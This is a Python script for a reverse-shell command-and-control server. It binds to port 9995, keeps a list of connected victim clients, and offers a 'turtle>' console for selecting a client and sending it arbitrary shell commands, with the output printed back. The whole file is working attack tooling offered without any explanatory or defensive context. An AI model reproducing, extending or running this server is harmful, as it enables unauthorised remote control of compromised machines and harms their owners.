import socket
import sys
import threading
from queue import Queue
# Constants
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue=Queue()

# Global variables
clients = []
client_addresses = []


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9995
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Added AF_INET and SOCK_STREAM for clarity
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding socket to port " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg))
        bind_socket()


def accepting_connections():
    for c in clients:
        c.close()
    del clients[:]
    del client_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)  # Prevents timeout
            clients.append(conn)
            client_addresses.append(address)
            print("Connection has been established with IP address " + str(address[0]))
        except socket.error as msg:
            print("Error accepting connection: " + str(msg))


def start_turtle():
    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections()
        elif cmd.startswith("select"):
            conn = get_target(cmd)
            if conn is not None:
                send_target_command(conn)
        else:
            print("Command is not recognized")


def list_connections():
    results = ""
    for i, conn in enumerate(clients):
        try:
            conn.send(b"ping")
            conn.recv(1024)
        except Exception as e:
            print("Error communicating with client:", e)
            del clients[i]
            del client_addresses[i]
            continue

        results += str(i) + " " + str(client_addresses[i][0]) + " " + str(client_addresses[i][1]) + "\n"
    print("-------------- Clients -----------\n" + results)


def get_target(cmd):
    try:
        id = int(cmd.split(" ")[-1])
        conn = clients[id]
        print("You are now connected to IP address: " + str(client_addresses[id][0]))
        return conn
    except (ValueError, IndexError):
        print("Selection not valid")
        return None


def send_target_command(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(cmd) > 0:
                conn.send(cmd.encode())
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except Exception as e:
            print("Error sending/receiving messages:", e)
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


# Entry point
if __name__ == "__main__":
    create_workers()
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

